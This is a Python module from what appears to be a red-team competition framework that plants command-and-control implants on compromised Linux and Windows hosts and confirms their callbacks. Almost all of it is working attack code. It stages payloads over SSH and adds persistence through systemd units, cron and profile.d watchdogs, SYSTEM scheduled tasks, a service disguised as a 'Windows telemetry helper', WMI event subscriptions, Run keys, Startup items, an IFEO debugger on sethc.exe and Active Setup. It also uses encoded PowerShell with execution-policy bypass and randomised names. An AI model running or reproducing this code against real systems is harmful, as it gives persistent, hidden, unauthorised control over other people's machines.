"""Planting the C2 channel on a box from the comp-prep payload manifest, and reading back the evidence."""

import json
import os
import tempfile
import time
from pathlib import Path

from ..errors import C2Error

from . import FakeMythic  # noqa: F401

MANIFEST_REL = Path("red/payloads/manifest.json")

# A launcher starts the agent now; a redundancy revives it after a kill.
# Surfaces that do both appear in both tuples.
WINDOWS_LAUNCHERS = ("task_onstart", "task_onlogon", "task_daily", "service",
                     "wmi", "run_key", "startup", "active_setup")
WINDOWS_REDUNDANCY = ("run_key", "startup", "ifeo", "active_setup", "wmi")
LINUX_REDUNDANCY = ("cron_watch", "profile_hook")


def manifest_path(comp_dir):
    return Path(comp_dir) / MANIFEST_REL


def load_manifest(comp_dir):
    path = manifest_path(comp_dir)
    if not path.exists():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except ValueError as exc:
        raise C2Error(f"{path} is not valid JSON: {exc}") from exc


def manifest_entries(manifest, box_id, transport=None):
    """All comp-prep payloads for one box, optionally one transport.

    Sliver keys the manifest by build name (`<box>-<transport>`); the Mythic
    matrix keys it `<box>:<transport>`. Accept both.
    """
    boxes = (manifest or {}).get("boxes") or {}
    out = []
    for key, entry in boxes.items():
        if not isinstance(entry, dict):
            continue
        key_box = entry.get("box") or key.split(":", 1)[0]
        key_transport = (key.split(":", 1)[1] if ":" in key
                         else entry.get("transport"))
        if key_box != box_id and key.split(":", 1)[0] != box_id:
            continue
        if transport and key_transport != transport:
            continue
        out.append(entry)
    return out


def manifest_entry(manifest, box_id, transport=None):
    entries = manifest_entries(manifest, box_id, transport)
    if not entries and transport:
        entries = manifest_entries(manifest, box_id)
    return entries[0] if entries else None


def payload_file(comp_dir, entry):
    if not entry:
        return None
    path = Path(comp_dir) / "red/payloads" / (entry.get("file") or "")
    return path if path.exists() else None


def _schtasks_status(output):
    for line in (output or "").splitlines():
        if line.strip().lower().startswith("status:"):
            return line.split(":", 1)[1].strip()
    return ""


class Planter:
    def __init__(self, ctx, comp_dir=None, manifest=None, now=None):
        self.ctx = ctx
        self.comp_dir = comp_dir or (ctx.cfg["run"].get("comp_dir") or ".")
        self.manifest = manifest if manifest is not None else load_manifest(self.comp_dir)
        self._now = now or time.time

    def plant(self, ip, box_id, os_name=None, *, transport=None, wait_sec=None):
        """Plant every selected transport; a channel counts only when its callback appears."""
        if wait_sec is None:
            wait_sec = int((self.ctx.cfg.get("c2") or {}).get("callback_wait_sec", 120))
        os_name = os_name or self.ctx.os_of(ip)
        entries = [entry for entry in manifest_entries(self.manifest, box_id, transport)
                   if entry.get("plant", True)]
        if not entries:
            return {"ok": False, "callback_seen": False, "box": box_id,
                    "detail": f"no plantable manifest entry for {box_id} "
                              "(run comp-prep / `tlaloc c2-prep` first)"}
        full = str(((self.ctx.cfg.get("c2") or {}).get("implant_spread", "draw"))
                   ).strip().lower() == "full"
        if not full and not transport:
            entries = entries[:1]
        installed, failures, paths, undos, mechanisms = [], [], [], [], []
        for entry in entries:
            local = payload_file(self.comp_dir, entry)
            entry_transport = entry.get("transport") or "mtls"
            if local is None:
                failures.append(f"{entry.get('name') or entry_transport}: payload "
                                f"missing from {self.comp_dir}/red/payloads")
                continue
            if os_name == "windows":
                outcome = self._install_windows(ip, box_id, local, entry_transport,
                                                wait_sec=wait_sec,
                                                suffix=entry_transport)
            else:
                outcome = self._install_linux(ip, box_id, local, entry_transport,
                                              suffix=entry_transport)
            outcome["name"] = entry.get("name")
            outcome["transport"] = entry_transport
            installed.append(outcome)
            if not outcome.get("ok"):
                failures.append(f"{entry_transport}: {outcome.get('detail')}")
            paths.extend(outcome.get("paths") or [])
            undos.extend(outcome.get("undo") or [])
            mechanisms.extend(outcome.get("mechanisms") or [])

        names = [outcome["name"] or box_id for outcome in installed]
        seen = self.wait_for_callbacks(names, wait_sec=wait_sec) if names else {}
        callback_seen = (all(seen.values()) if full else any(seen.values())) \
            if seen else False
        ok = bool(installed) and not failures
        detail = "; ".join(
            f"{outcome['transport']}: {outcome.get('detail')}" for outcome in installed)
        if failures:
            detail = "; ".join(failures)
        return {"ok": ok, "callback_seen": callback_seen, "box": box_id,
                "os": os_name, "transport": installed[0]["transport"] if installed else None,
                "detail": detail, "unit": installed[0].get("unit") if installed else None,
                "paths": paths, "undo": undos, "mechanisms": mechanisms,
                "coverage": {name: bool(seen.get(name)) for name in names},
                "uuid": installed[0].get("uuid") if installed else None,
                "payload": str(payload_file(self.comp_dir, entries[0]) or "")}

    def _install_linux(self, ip, box_id, local, transport, *, suffix=""):
        from ..effects import artifactnames as names
        from ..effects.base import root_cmd
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        names_drawn = names.linux_names(self.ctx.world, rng=self.ctx.rng,
                                       mode=names.mode_from_cfg(self.ctx.cfg))
        if suffix:
            names_drawn = dict(names_drawn)
            names_drawn["stem"] = f"{names_drawn['stem']}-{suffix}"
            unit = names_drawn["unit"]
            names_drawn["unit"] = (unit[:-len(".service")] + f"-{suffix}.service"
                                   if unit.endswith(".service") else f"{unit}-{suffix}")
        unit = names_drawn["unit"]
        stage = f"/tmp/{names_drawn['stem']}"
        tag = f"-{suffix}" if suffix else ""
        remote = f"/usr/local/lib/{names_drawn['stem']}/{box_id}{tag}"
        unit_path = f"/etc/systemd/system/{unit}"
        # Every privileged step rides the escalation the seed proved (or a root
        # foothold); a sudo refusal means the label was wrong, never a retry without it.
        label = fh.get("escalation") or fh.get("kind") or "?"
        rc, _out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                        f"mkdir -p {stage}", timeout=60,
                                        key_path=fh.get("key_path"))
        if rc != 0:
            return {"ok": False, "detail": f"payload staging dir on {ip} failed: "
                            f"{(err or _out).strip()[:200]}", "paths": [remote]}
        unit_text = (
            "[Unit]\n"
            f"Description={names_drawn['unit_desc']}\n"
            "After=network-online.target\n\n"
            "[Service]\n"
            f"ExecStart={remote}\n"
            "Restart=always\nRestartSec=15\n\n"
            "[Install]\nWantedBy=multi-user.target\n")
        try:
            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", str(local),
                                  f"{stage}/{box_id}{tag}", mode=0o755,
                                  key_path=fh.get("key_path"))
            # The unit rides sftp like the payload: a heredoc cannot repeat a
            # non-sudo command through an escape label.
            with tempfile.NamedTemporaryFile("w", encoding="utf-8") as staged_unit:
                staged_unit.write(unit_text)
                staged_unit.flush()
                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
                                      staged_unit.name, f"{stage}/{unit}",
                                      mode=0o644, key_path=fh.get("key_path"))
        except Exception as exc:
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}
        privileged = (
            ("create install dir", f"mkdir -p /usr/local/lib/{names_drawn['stem']}"),
            ("move payload", f"mv {stage}/{box_id}{tag} {remote}"),
            ("chmod payload", f"chmod 755 {remote}"),
            ("move unit", f"mv {stage}/{unit} {unit_path}"),
            ("daemon-reload", "systemctl daemon-reload"),
            ("enable unit", f"systemctl enable --now {unit}"),
        )
        for step, cmd in privileged:
            rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                           root_cmd(cmd, fh), timeout=120,
                                           key_path=fh.get("key_path"))
            if rc != 0:
                return {"ok": False,
                        "detail": (f"{unit} install failed at {step} on {ip} via "
                                   f"{label} ({cmd}): "
                                   f"{(err or out).strip()[:200]}"),
                        "unit": unit, "paths": [remote, unit_path],
                        "check_cmd": f"systemctl is-active {unit}"}
        rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                       f"systemctl is-active {unit}", timeout=60,
                                       key_path=fh.get("key_path"))
        ok = rc == 0 and (out or "").strip().splitlines()[-1:] == ["active"]
        if not ok:
            return {"ok": False,
                    "detail": f"unit install rc={rc} via {label}: "
                              f"{(err or out).strip()[:200]}",
                    "unit": unit, "paths": [remote, unit_path],
                    "check_cmd": f"systemctl is-active {unit}"}
        mech, extra_paths, extra_undo, note = self._linux_redundant(
            ip, fh, names_drawn, remote, stage)
        undo = ([f"systemctl disable --now {unit}",
                 f"rm -f {remote} {unit_path}"] + extra_undo)
        return {"ok": True,
                "detail": (f"{unit} active on {ip} (transport {transport}); {note}"
                           if note else f"{unit} active on {ip} (transport {transport})"),
                "unit": unit, "paths": [remote, unit_path] + extra_paths,
                "mechanisms": ["systemd"] + mech,
                "undo": undo,
                "check_cmd": f"systemctl is-active {unit}"}

    def _linux_redundant(self, ip, fh, drawn, remote, stage):
        from ..effects.base import root_cmd        # lazy: avoids a cycle
        NL = chr(10)
        c2 = (self.ctx.cfg or {}).get("c2") or {}
        full = str(c2.get("implant_spread", "draw")).strip().lower() == "full"
        mechs = list(LINUX_REDUNDANCY) if full else [self.ctx.rng.choice(LINUX_REDUNDANCY)]
        stem = drawn["stem"]
        chosen, paths, undo, notes = [], [], [], []
        for mech in mechs:
            if mech == "cron_watch":
                path = "/etc/cron.d/" + stem
                body = ("@reboot root " + remote + " >/dev/null 2>&1" + NL
                        + '*/17 * * * * root pgrep -f "' + remote + '" >/dev/null 2>&1 '
                        + "|| " + remote + " >/dev/null 2>&1" + NL)
            else:
                path = "/etc/profile.d/" + stem + ".sh"
                body = ("# " + str(drawn.get("unit_desc") or stem) + NL
                        + 'pgrep -f "' + remote + '" >/dev/null 2>&1 '
                        + "|| { setsid " + remote + " >/dev/null 2>&1 & }" + NL)
            staged = stage + "/" + path.rsplit("/", 1)[-1]
            local = None
            try:
                fd, local = tempfile.mkstemp(prefix="tlaloc-extra-", suffix=".txt")
                with os.fdopen(fd, "w", encoding="utf-8") as handle:
                    handle.write(body)
                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local,
                                      staged, mode=0o644, key_path=fh.get("key_path"))
                restart = ("systemctl try-restart cron 2>/dev/null "
                           "|| service cron restart 2>/dev/null || true"
                           if mech == "cron_watch" else "true")
                rc, out, err = self.ctx.ssh.ssh(
                    ip, fh["user"], fh.get("password") or "",
                    root_cmd("mv " + staged + " " + path + " && chmod 644 " + path, fh)
                    + NL + restart,
                    timeout=90, key_path=fh.get("key_path"))
                chosen.append(mech)
                paths.append(path)
                undo.append("rm -f " + path)
                if mech == "cron_watch":
                    undo.append("systemctl try-restart cron 2>/dev/null || true")
                notes.append(mech + " at " + path + " rc=0" if rc == 0 else
                             mech + " rc=" + str(rc) + ": " + (err or out).strip()[:120])
            except Exception as exc:
                notes.append(mech + " failed: " + str(exc))
            finally:
                if local and os.path.exists(local):
                    os.unlink(local)
        return chosen, paths, undo, "; ".join(notes)

    def _install_windows(self, ip, box_id, local, transport, wait_sec=120, *, suffix=""):
        from ..effects import artifactnames as names
        fh = self.ctx.world.foothold(ip)
        if not fh:
            return {"ok": False, "detail": f"no foothold on {ip} to plant {box_id}"}
        rng = self.ctx.rng
        drawn = names.windows_names(self.ctx.world, rng=rng,
                                    mode=names.mode_from_cfg(self.ctx.cfg))
        if suffix:
            drawn = dict(drawn)
            for key in ("stem", "task", "service", "run_value", "wmi"):
                if drawn.get(key):
                    drawn[key] = f"{drawn[key]}-{suffix}"
        full_spread = (str(((self.ctx.cfg or {}).get("c2") or {})
                           .get("implant_spread", "draw")).strip().lower() == "full")
        if full_spread:
            launcher = WINDOWS_LAUNCHERS[0]
            redundant = list(WINDOWS_LAUNCHERS[1:]) + [
                m for m in WINDOWS_REDUNDANCY if m not in WINDOWS_LAUNCHERS]
        else:
            launcher = rng.choice(WINDOWS_LAUNCHERS)
            redundant = [m for m in WINDOWS_REDUNDANCY
                         if m not in (launcher,)]
            rng.shuffle(redundant)
            redundant = redundant[:rng.choice((1, 2))]
        remote_dir = f"C:\\ProgramData\\{drawn['stem']}"
        tag = f"-{suffix}" if suffix else ""
        remote = f"{remote_dir}\\{box_id}{tag}.exe"
        staged = f"C:/ProgramData/{drawn['stem']}/{box_id}{tag}.exe"
        try:
            self._win(ip, fh, f'powershell -NoProfile -Command "New-Item -ItemType '
                              f'Directory -Force -Path \'{remote_dir}\' | Out-Null"')
            self._put(ip, fh, local, staged)
        except Exception as exc:
            return {"ok": False, "detail": f"payload copy to {ip} failed: {exc}",
                    "paths": [remote]}

        exe = Path(staged).name
        guard = (f'cmd /c tasklist /FI "IMAGENAME eq {exe}" | find /I "{exe}" >nul '
                 f'|| start "" /b "{remote}"')
        undo, artifacts, notes = [], [], []
        chosen = []
        for mechanism in [launcher] + redundant:
            names_i = drawn
            if full_spread:
                # Fresh drawn names per surface: task triggers sharing one name
                # would overwrite; the stem stays so all point at one payload.
                names_i = dict(names.windows_names(self.ctx.world, rng=rng,
                                                   mode=names.mode_from_cfg(self.ctx.cfg)),
                               stem=drawn["stem"])
            spec = WINDOWS_MECHANISMS[mechanism](self, ip, fh, names_i, remote, guard)
            chosen.append(mechanism)
            notes.append(f"{mechanism}: {spec['detail']}")
            undo.extend(spec["undo"])
            artifacts.extend(spec["paths"])
        # The launcher may be passive (logon trigger, WMI timer): start the
        # agent once so the channel is live inside this seed window.
        alive = self._win_process_running(ip, fh, Path(staged).name)
        if not alive:
            self._start_detached(ip, fh, remote)
            deadline = self._now() + 20
            while not alive and self._now() < deadline:
                time.sleep(3)
                alive = self._win_process_running(ip, fh, Path(staged).name)
        return {"ok": bool(alive),
                "detail": (f"{Path(staged).name} running on {ip} via "
                           f"{' + '.join(chosen)} (transport {transport})" if alive
                           else f"payload never started on {ip}: " + "; ".join(notes)[:180]),
                "unit": launcher, "paths": [remote] + artifacts,
                "mechanisms": chosen,
                "undo": undo or [f'schtasks /Delete /TN "{drawn["task"]}" /F',
                                 f"Remove-Item -Path '{remote}' -Force"],
                "check_cmd": f'tasklist /FI "IMAGENAME eq {Path(staged).name}"'}

    def _put(self, ip, fh, local, remote, mode=None, attempts=2):
        """A 40-50MB implant over Windows OpenSSH occasionally drops one SFTP put."""
        for attempt in range(attempts):
            try:
                self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "",
                                      str(local), remote, mode=mode,
                                      key_path=fh.get("key_path"))
                return
            except Exception:
                if attempt + 1 >= attempts:
                    raise
                time.sleep(3)

    def _win_ps(self, ip, fh, body, timeout=120):
        """-EncodedCommand is one token: cmd /c quoting silently lost embedded reg/WMI values."""
        import base64
        blob = base64.b64encode(body.encode("utf-16-le")).decode()
        return self._win(ip, fh, f"powershell -NoProfile -ExecutionPolicy Bypass "
                                 f"-EncodedCommand {blob}", timeout=timeout)

    def _win(self, ip, fh, command, timeout=120):
        return self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "", command,
                                timeout=timeout, key_path=fh.get("key_path"))

    def _start_detached(self, ip, fh, remote):
        """Windows sshd kills its child tree when the session closes; Win32_Process.Create spawns detached under the WMI service."""
        q = '"'
        body = ("Invoke-CimMethod -ClassName Win32_Process -MethodName Create "
                "-Arguments @{CommandLine='" + q + remote + q + "'} | "
                "Select-Object -ExpandProperty ReturnValue")
        return self._win_ps(ip, fh, body, timeout=90)

    @staticmethod
    def _why(rc, err, out):
        if rc == 0:
            return "rc=0"
        text = " ".join((err or out or "").split())[:120]
        return f"rc={rc}" + (f": {text}" if text else "")

    def _win_process_running(self, ip, fh, image):
        _rc, out, _err = self._win(
            ip, fh, f'tasklist /FI "IMAGENAME eq {image}"', timeout=60)
        return image.lower() in (out or "").lower()

    def _mech_task(self, ip, fh, drawn, remote, guard=None, *, trigger,
                   mo=None, st=None):
        task = drawn["task"]
        # The task runs a guard stub, not a bare /TR: every re-registration would
        # stack another agent copy, and schtasks mangles an inline piped /TR.
        stub = remote.rsplit("\\", 1)[0] + "\\" + task.replace(" ", "") + "-run.cmd"
        body = guard[len("cmd /c "):] if guard else f'start "" /b "{remote}"'
        self._win_ps(ip, fh, f"Set-Content -LiteralPath '{stub}' -Value '{body}' "
                             f"-Encoding ascii", timeout=90)
        script = (f'schtasks /Create /TN "{task}" /TR "cmd /c {stub}" /SC {trigger}'
                  + (f" /MO {mo}" if mo else "")
                  + (f" /ST {st}" if st else "")
                  + ' /RU SYSTEM /RL HIGHEST /F'
                  + (' && schtasks /Run /TN "' + task + '"' if trigger == "ONSTART" else ""))
        rc, out, err = self._win(ip, fh, script, timeout=180)
        return {"detail": f"task {task} ({trigger}{'/' + mo if mo else ''}) rc={rc}",
                "paths": [f"task:{task}", stub],
                "undo": [f'schtasks /End /TN "{task}"',
                         f'schtasks /Delete /TN "{task}" /F',
                         f"Remove-Item -Path '{stub}' -Force"]}

    def _mech_task_onstart(self, ip, fh, drawn, remote, guard):
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONSTART")

    def _mech_task_onlogon(self, ip, fh, drawn, remote, guard):
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="ONLOGON")

    def _mech_task_daily(self, ip, fh, drawn, remote, guard):
        minute = self.ctx.rng.randrange(1, 60)
        return self._mech_task(ip, fh, drawn, remote, guard, trigger="MINUTE",
                               mo="60", st=f"00:{minute:02d}")

    def _mech_service(self, ip, fh, drawn, remote, guard):
        # A console agent cannot be an SCM service (1053), so the service wraps
        # the detached launcher; `sc failure` restarts it if it stops.
        svc = drawn["service"]
        script = (f'sc create "{svc}" binPath= "{guard}" '
                  f'start= auto && sc description "{svc}" "Windows telemetry helper" && '
                  f'sc failure "{svc}" reset= 0 actions= restart/60000 && sc start "{svc}"')
        rc, out, err = self._win(ip, fh, script, timeout=180)
        return {"detail": f"service {svc} rc={rc}",
                "paths": [f"service:{svc}"],
                "undo": [f'sc stop "{svc}"', f'sc delete "{svc}"']}

    def _mech_wmi(self, ip, fh, drawn, remote, guard):
        name = drawn["wmi"]
        body = (
            f"$f = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
            f"-Arguments @{{Name='{name}'; EventNamespace='root\\cimv2'; "
            f"QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent "
            f"WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}}; "
            f"$c = Set-WmiInstance -Namespace root\\subscription -Class "
            f"CommandLineEventConsumer -Arguments @{{Name='{name}'; "
            f"CommandLineTemplate='{guard}'; ExecutablePath='cmd.exe'}}; "
            "Set-WmiInstance -Namespace root\\subscription -Class "
            "__FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c} | Out-Null")
        rc, out, err = self._win_ps(ip, fh, body, timeout=180)
        return {"detail": f"WMI subscription {name} " + self._why(rc, err, out),
                "paths": [f"wmi:{name}"],
                "undo": [f"Get-WmiObject -Namespace root\\subscription -Class "
                         f"__FilterToConsumerBinding | Where-Object {{ "
                         f"$_.Consumer -match '{name}' }} | Remove-WmiObject; "
                         f"Get-WmiObject -Namespace root\\subscription -Class "
                         f"__EventFilter | Where-Object {{ $_.Name -eq '{name}' }} | "
                         f"Remove-WmiObject; Get-WmiObject -Namespace root\\subscription "
                         f"-Class CommandLineEventConsumer | Where-Object {{ "
                         f"$_.Name -eq '{name}' }} | Remove-WmiObject"]}

    def _mech_run_key(self, ip, fh, drawn, remote, guard):
        value = drawn["run_value"]
        rc, out, err = self._win_ps(
            ip, fh, f"Set-ItemProperty -LiteralPath "
                    f"'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' "
                    f"-Name '{value}' -Value '{guard}' -Force", timeout=90)
        return {"detail": f"HKLM Run value {value} " + self._why(rc, err, out),
                "paths": [f"registry:HKLM\\...\\Run\\{value}"],
                "undo": [f'reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion'
                         f'\\Run" /v "{value}" /f']}

    def _mech_startup(self, ip, fh, drawn, remote, guard):
        name = drawn["run_value"]
        cmd = f"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{name}.cmd"
        body = guard[len("cmd /c "):]
        rc, out, err = self._win_ps(
            ip, fh, f"Set-Content -LiteralPath 'C:\\ProgramData\\Microsoft\\Windows"
                    f"\\Start Menu\\Programs\\Startup\\{name}.cmd' -Value '{body}' "
                    f"-Encoding ascii", timeout=90)
        return {"detail": f"startup item {name}.cmd " + self._why(rc, err, out),
                "paths": [cmd],
                "undo": [f'Remove-Item -Path \'{cmd}\' -Force']}

    def _mech_ifeo(self, ip, fh, drawn, remote, guard):
        # IFEO debugger on sethc.exe: starts as SYSTEM at the logon screen.
        target = "sethc.exe"
        key = (f"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File "
               f"Execution Options\\{target}")
        rc, out, err = self._win_ps(
            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name Debugger "
                    f"-Value '{remote}' -Force", timeout=90)
        return {"detail": f"IFEO debugger on {target} " + self._why(rc, err, out),
                "paths": [f"registry:{key}\\Debugger"],
                "undo": [f'reg delete "{key}" /v Debugger /f']}

    def _mech_active_setup(self, ip, fh, drawn, remote, guard):
        rng = self.ctx.rng
        hex8 = lambda n: "".join(f"{rng.randrange(16):x}" for _ in range(n))
        guid = f"{{{hex8(8)}-{hex8(4)}-{hex8(4)}-{hex8(4)}-{hex8(12)}}}"
        key = (f"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{guid}")
        stub = guard
        rc, out, err = self._win_ps(
            ip, fh, f"New-Item -Path '{key}' -Force | Out-Null; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name StubPath "
                    f"-Value '{stub}' -Force; "
                    f"Set-ItemProperty -LiteralPath '{key}' -Name Version "
                    f"-Value '1,0,0,0' -Force", timeout=90)
        return {"detail": f"Active Setup {guid} " + self._why(rc, err, out),
                "paths": [f"registry:{key}"],
                "undo": [f'reg delete "{key}" /f']}

    def wait_for_callback(self, box_id, *, wait_sec=45, poll_interval=5):
        """tavern/mythic keep callback rows after the agent dies; only a fresh row counts."""
        return self.wait_for_callbacks([box_id], wait_sec=wait_sec,
                                       poll_interval=poll_interval).get(box_id, False)

    def wait_for_callbacks(self, names, *, wait_sec=45, poll_interval=5):
        """Poll every planted name at once: a channel is proven by its own fresh row."""
        pending = list(dict.fromkeys(names))
        seen = {name: False for name in pending}
        if self.ctx.c2 is None or not pending:
            return seen
        deadline = self._now() + max(wait_sec, 0)
        while True:
            try:
                records = self.ctx.c2.callbacks_by_name() \
                    if hasattr(self.ctx.c2, "callbacks_by_name") \
                    else self.ctx.c2.callbacks()
            except C2Error:
                return seen
            for name in pending:
                if seen[name]:
                    continue
                record = records.get(name)
                if not record:
                    record = self.ctx.c2.callback_for(name) \
                        if hasattr(self.ctx.c2, "callback_for") else None
                if record and self._fresh(record):
                    seen[name] = True
                    if self.ctx.world is not None and record.get("seen_at"):
                        self.ctx.world.note_callback(
                            record.get("box_id") or name,
                            self._iso(record["seen_at"]), agent=record.get("agent"),
                            external_id=record.get("external_id"))
            if all(seen.values()) or self._now() >= deadline:
                return seen
            time.sleep(poll_interval)

    def _fresh(self, record):
        if not record:
            return False
        if str(record.get("agent") or "").lower() == "none":
            return False
        max_age = float(self.ctx.cfg["c2"].get("callback_max_age_sec", 120))
        if hasattr(self.ctx.c2, "record_fresh"):
            return bool(self.ctx.c2.record_fresh(record, max_age))
        seen = record.get("seen_at")
        return bool(seen) and (self._now() - float(seen)) <= max_age

    def _iso(self, epoch):
        return time.strftime("%Y-%m-%dT%H:%M:%S", time.gmtime(float(epoch)))


WINDOWS_MECHANISMS = {
    "task_onstart": Planter._mech_task_onstart,
    "task_onlogon": Planter._mech_task_onlogon,
    "task_daily": Planter._mech_task_daily,
    "service": Planter._mech_service,
    "wmi": Planter._mech_wmi,
    "run_key": Planter._mech_run_key,
    "startup": Planter._mech_startup,
    "ifeo": Planter._mech_ifeo,
    "active_setup": Planter._mech_active_setup,
}
